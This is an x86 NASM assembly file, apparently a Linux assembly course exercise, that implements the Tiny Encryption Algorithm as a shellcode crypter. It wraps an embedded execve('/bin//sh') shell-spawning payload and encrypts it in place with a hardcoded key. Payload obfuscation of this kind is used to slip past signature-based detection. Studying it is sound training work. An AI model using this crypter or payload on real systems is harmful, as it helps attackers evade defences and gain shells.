; Paolo Stagno aka [VoidSec](https://voidsec.com)
; SLAE-1511
; NASM Implementation of the Tiny Encryption Algorithm (TEA)
; https://en.wikipedia.org/wiki/Tiny_Encryption_Algorithm

global _start
; EAX = SUM result
; ECX = COUNTER
; EBX = current chunk
; EDX = sum
; ESI = *encrypted_shellcode
; EDI = *key
section .text
_start:
	jmp short key_section				; goto key_section

key_section:
	; key0: 0x6c645a37
	; key1: 0x6e775667
	; key2: 0x57433641
	; key3: 0x4e6c7151
	call key_loader					; goto key_loader, putting key on the stack
	;       |          0          |            1           |           2          |            3           |
	;       |         EDI         |          EDI+4         |         EDI+8        |          EDI+12        |
	key: db 0x6c, 0x64, 0x5a, 0x37, 0x6e, 0x77, 0x56, 0x67, 0x57, 0x43, 0x36, 0x41, 0x4e, 0x6c, 0x71, 0x51

key_loader:
	pop edi								; load address of our key into EDI (JMP CALL POP trick)
	jmp short shellcode_section			; goto shellcode_section

encoder:								; encoder
	pop esi								; load address of our shellcode into ESI (JMP CALL POP trick)
	mov ecx, 3							; load the number of our shellcode chunks, used to loop. (shellcode length is 24. 24/4(DWORD)=6 blocks/2(chunks taken 2by 2)=3)

encrypt_loop:
	push ecx							; save counter status before entering 32 iteration loop
    mov ecx, 32							; store loop counter, we nedd to cycle x32 times
	xor edx, edx						; clean EDX (sum), EDX = 0
	loop_32:
		mov ebx, dword [esi+4]			; v1 load encrypted_shellcode's chunk DWORD pointed by ESI in EBX | EBX=B
		; sum = sum+delta
		add	edx, 0x9E3779B9				; sum = sum+delta
		; v0 = v0 + ((v1<<4) + k0) ^ (v1 + sum) ^ ((v1>>5) + k1);
		mov eax, ebx					; v1 is now in EAX
		shl eax, 4						; v1<<4
		add eax, dword [edi]			; +k0
		push eax						; store EAX (result) on stack
		mov eax, ebx					; v1 is now in EAX
		add eax, edx					; v1 + sum
		push eax						; store EAX (result) on stack
		mov eax, ebx					; v1 is now in EAX
		shr eax, 5						; v1>>5
		add eax, dword [edi+4]			; +k1
		; EAX = ((v1>>5) + k1)
		pop ebx							; restore EBX = (v1 + sum)
		xor eax, ebx					; EAX = (v1 + sum) ^ ((v1>>5) + k1)
		pop ebx							; restore EBX = (v1<<4) + k0)
		xor eax, ebx					; EAX = ((v1<<4) + k0) ^ (v1 + sum) ^ ((v1>>5) + k1)
		add eax, dword [esi]			; v0 = v0 + ((v1<<4) + k0) ^ (v1 + sum) ^ ((v1>>5) + k1)
		push eax						; store encrypted v0 on stack
		;--------------------------------------------------------------------------------------
		mov ebx, dword [esi]			; v0 load shellcode's chunk DWORD pointed by ESI in EBX | EBX=A
		; v1 = v1 + ((v0<<4) + k2) ^ (v0 + sum) ^ ((v0>>5) + k3);
		mov eax, ebx					; v0 is now in EAX
		shl eax, 4						; v0<<4
		add eax, dword [edi+8]			; +k2
		push eax						; store EAX (result) on stack
		mov eax, ebx					; v0 is now in EAX
		add eax, edx					; v0 + sum
		push eax						; store EAX (result) on stack
		mov eax, ebx					; v0 is now in EAX
		shr eax, 5						; v0>>5
		add eax, dword [edi+12]			; +k3
		; EAX = ((v0>>5) + k3)
		pop ebx							; restore EBX = (v0 + sum)
		xor eax, ebx					; EAX = (v0 + sum) ^ ((v0>>5) + k3)
		pop ebx							; restore EBX = (v0<<4) + k2)
		xor eax, ebx					; EAX = ((v0<<4) + k2) ^ (v0 + sum) ^ ((v0>>5) + k3)
		add eax, dword [esi+4]			; v1 = v1 + ((v0<<4) + k2) ^ (v0 + sum) ^ ((v0>>5) + k3)
		push eax						; store encrypted v1 on stack
		loop loop_32					; ECX is 0? No, we go back at loop_32 and execute the cicle again
	; save encrypted v0, v1
	save:
	pop eax								; EAX=v1
	mov dword [esi+4], eax				; store encrypted v1 back to shellcode "buffer"
	pop eax								; EAX=v0
	mov dword [esi], eax				; store encrypted v0 back to shellcode "buffer"
	; ------
	mov ecx, 62							; for every loop_32 cicle I've saved v0,v1 on the stack (32*2)-2(already popped)
	stack_clean:
		pop eax							; clean the stack of precedent v0,v1 values popping saved values in eax
		loop stack_clean
	; ------
	pop ecx								; restore ECX counter status
	add esi, 8							; select next chunk "couple"				
    loop encrypt_loop					; ECX is 0? No, we go back at decrypt_loop and execute the cicle again
    exec:
	int3
	jmp short encrypted_shellcode		; ECX is 0! We've encrypted our shellcode and we can now directly jump into it

shellcode_section:
        call encoder					; goto decoder, putting shellcode on the stack
		;                       |          A          |           B           |           C           |           D            |          E           |            F          |
		;						|         ESI         |         ESI+4         |         ESI+8         |         ESI+12         |        ESI+16        |          ESI+20       |
        encrypted_shellcode: db 0x31, 0xc0, 0x50, 0x68, 0x2f, 0x2f, 0x73, 0x68, 0x68, 0x2f, 0x62, 0x69, 0x6e, 0x87, 0xe3, 0xb0, 0x0b, 0xcd, 0x80, 0x90, 0x90, 0x90, 0x90, 0x90
		;						|<-chunk read direction| 